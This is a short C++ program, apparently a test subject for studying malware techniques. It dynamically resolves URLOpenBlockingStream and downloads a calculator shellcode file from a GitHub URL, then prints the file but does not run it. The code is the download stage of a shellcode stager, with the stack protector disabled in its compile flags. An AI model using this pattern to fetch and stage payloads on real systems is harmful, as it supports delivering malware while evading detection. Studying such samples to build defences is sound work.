// Compile with:
// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /EHsc subject6.cpp /link /OUT:subject6.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

#include <sstream>
#include <string>
#include <iostream>
#include <windows.h>

using namespace std;

int main() {
    IStream *stream;
    HMODULE urlmon = GetModuleHandleA("urlmon.dll");
    if (urlmon == NULL) {
    	cout << "Failed to load DLL" << endl;
    	DWORD dLastError = GetLastError();
	    cout << dLastError << endl;
    }
    else {
    	cout << "DLL loaded correctly" << endl;
    }
    //using URLOpenBlockingStreamPrototype = HRESULT(WINAPI*)(LPUNKNOWN, LPCSTR, LPSTREAM*, DWORD, LPBINDSTATUSCALLBACK);
    typedef HRESULT (WINAPI* URLOpenBlockingStreamPrototype)(LPUNKNOWN, LPCSTR, LPSTREAM*, DWORD, LPBINDSTATUSCALLBACK);
    URLOpenBlockingStreamPrototype URLOpenBlockingStream = (URLOpenBlockingStreamPrototype)GetProcAddress(urlmon, "URLOpenBlockingStream");
    HRESULT result = URLOpenBlockingStream(NULL, "https://raw.githubusercontent.com/slaeryan/DigitalOceanTest/master/calc_shellcode_32_hex.txt", &stream, 0, NULL);
    if (result != 0) {
        return 0;
    }
    char buffer[100];
    unsigned long bytesRead;
    stringstream ss;
    stream->Read(buffer, 100, &bytesRead);
    while (bytesRead > 0U) {
        ss.write(buffer, (long long)bytesRead);
        stream->Read(buffer, 100, &bytesRead);
    }
    stream->Release();
    string resultString = ss.str();
    cout << resultString << endl;
}
